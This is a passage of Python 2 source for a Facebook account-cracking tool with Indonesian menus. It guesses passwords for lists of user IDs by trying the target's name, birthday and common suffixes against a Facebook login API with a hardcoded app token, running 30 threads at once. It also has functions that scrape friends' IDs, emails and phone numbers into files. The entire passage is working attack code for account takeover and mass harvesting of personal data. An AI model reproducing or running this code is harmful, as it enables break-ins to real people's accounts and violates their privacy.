			w = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
			q = json.loads(w.text)
			# Password Guess 1
			pass1 = q['first_name'] + '123'
			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			u = json.load(data)
			if 'access_token' in u:
			    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
                        elif 'www.facebook.com' in u['error_msg']:
                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
                        else:
            	            # Password Guess 2
                            pass2 = q['first_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            u = json.load(data)
                            if 'access_token' in u:
                                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2
                            elif 'www.facebook.com' in u['error_msg']:
                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
                            else:
                	        # Password Guess 3
                                pass3 = q['last_name'] + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                u = json.load(data)
                                if 'access_token' in u:
                                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3
                                elif 'www.facebook.com' in u['error_msg']:
                                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
                                else:
                    	            # Password Guess 4
                                    birth = q['birthday']
                                    pass4 = birth.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    u = json.load(data)
                                    if 'access_token' in u:
                                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
                                    elif 'www.facebook.com' in u['error_msg']:
                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
                                    else:
                                        # Password Guess 5
                                        pass5 = '786786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        u = json.load(data)
                                        if 'access_token' in u:
                            	            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
                                        elif 'www.facebook.com' in u['error_msg']:
                            	            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
                                        else:
                            	            # Password Guess 6
                            	            pass6 = 'Pakistan'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            u = json.load(data)
                                            if 'access_token' in u:
                                	        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
                                            elif 'www.facebook.com' in u['error_msg']:
                            	                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
                                            else:
                            	                # Password Guess 7
                            	                pass7 = b['first_name'] + '1234'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                u = json.load(data)
                                                if 'access_token' in u:
                                	            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass7
                                                elif 'www.facebook.com' in u['error_msg']:
                            	                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass7
                                                else:
                            	                    # Password Guess 8
                            	                    pass8 = q['first_name'] + '786'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    u = json.load(data)
                                                    if 'access_token' in u:
                                	                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass8
                                                    elif 'www.facebook.com' in u['error_msg']:
                            	                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass8
                                                    else:
                            	                        # Password Guess 9
                            	                        pass9 = q['first_name'] + 'Khan'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        u = json.load(data)
                                                        if 'access_token' in u:
                                	                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass9
                                                        elif 'www.facebook.com' in u['error_msg']:
                            	                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass9
                                                        else:
                            	                            # Password Guess 10
                            	                            pass10 = q['first_name'] + q['last_name']
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            u = json.load(data)
                                                            if 'access_token' in u:
                                	                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass10
                                                            elif 'www.facebook.com' in u['error_msg']:
                            	                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass10
                                                            else:
                            	                                # Password Guess 11
                            	                                pass11 = q['first_name'] + q['last_name'] + '123'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                u = json.load(data)
                                                                if 'access_token' in u:
                                	                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass11
                                                                elif 'www.facebook.com' in u['error_msg']:
                            	                                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass11
                                                                else:
                            	                                    # Password Guess 12
                            	                                    pass12 = 'Pakistan786'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    u = json.load(data)
                                                                    if 'access_token' in u:
                                	                                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass12
                                                                    elif 'www.facebook.com' in u['error_msg']:
                            	                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass12
                                                                    else:
                            	                                        # Password Guess 13
                            	                                        pass13 = 'Pakistan1'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        u = json.load(data)
                                                                        if 'access_token' in u:
                                	                                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass13
                                                                        elif 'www.facebook.com' in u['error_msg']:
                            	                                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass13
                                                                        else:
                            	                                            # Password Guess 14
                            	                                            pass14 = q['first_name'] + q['last_name'] + '786'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            u = json.load(data)
                                                                            if 'access_token' in u:
                                	                                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass14
                                                                            elif 'www.facebook.com' in u['error_msg']:
                            	                                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass14
                                                                            else:
                                                                                pass
                            		
                except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()
	
def asif():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1. ID Dari Teman      "
        time.sleep(0.05)
        print "\033[1;97m»»2. ID Teman Dari Teman      "
        time.sleep(0.05)
        print "\033[1;97m»»3. ID Dari Group         "
        time.sleep(0.05)
        print "\033[1;97m»»4. Ambil Email Teman        "
        time.sleep(0.05)
        print "\033[1;97m»»5. Ambil Email Teman Dari Teman"
        time.sleep(0.05)
        print "\033[1;97m»»6 . Nomor HP Dari Teman"
        time.sleep(0.05)
        print "\033[1;97m»»7.»»Nomor HP Teman Dari Teman"
        time.sleep(0.05)
        print "\033[1;97m»»8. Semua Informasi Dari Teman"
        time.sleep(0.05)
	print "\033[1;91m»»0 .»» Kembali                          "
	pilih_asif()

def pilih_asif():
	peak = raw_input("\n\033[1;97mPilih Menu>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_asif()
	elif peak =="1":
		id_friends()
        elif peak =="2":
	        idfrom_friends()
        elif peak =="3":
                id_member_grup()
        elif peak =="4":
	        email()
        elif peak =="5":
	        emailfrom_friends()
        elif peak =="6":
	        nomor_hp()
        elif peak =="7":
	        hpfrom_friends()
        elif peak =="8":
                informasi()
	elif peak =="0":
		menu()

def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Salah'
        os.system('rm -rf login.txt')

        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait ...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;97mName  :\x1b[1;92m ' + ah['name']
                print '\x1b[1;97mID    : \x1b[1;92m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;92m%s' % len(idfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] File Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Berhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Salah'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;97mInput ID Friends : \x1b[1;92m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;97m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                asif()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mType File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;97mName  :\x1b[1;92m ' + ah['name']
                print '\x1b[1;97mID    : \x1b[1;92m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;92m%s' % len(idfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Save : \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mkembali \x1b[1;91m]')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] berhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mkembali \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada Internet'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Salah'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup :\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;97m\xe2\x9c\x93\x1b[1;91m] \x1b[1;97mNama group :\x1b[1;92m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group Tidak Ditemukan'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                asif()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Berhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Group Tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak Ada Koneksi'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Salah'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu Sebentar \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;97mNama  :\x1b[1;92m ' + z['name']
                    print '\x1b[1;97mEmail : \x1b[1;92m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;92m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Berhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak Ada Koneksi'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Salah'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                asif()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;96m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;96m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Phone\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] An error occurred '
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput Friends ID \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;95mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal number\x1b[1;96m%s' % len(hpfromfriends)
            print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;95m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;95m[\xe2\x9c\x96] No connection'
            keluar()

def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m♡"
			try:
				print '\033[1;91m[☆] \033[1;92mName\033[1;95m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;92m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;96m         : \033[1;91mNot found'
			try:
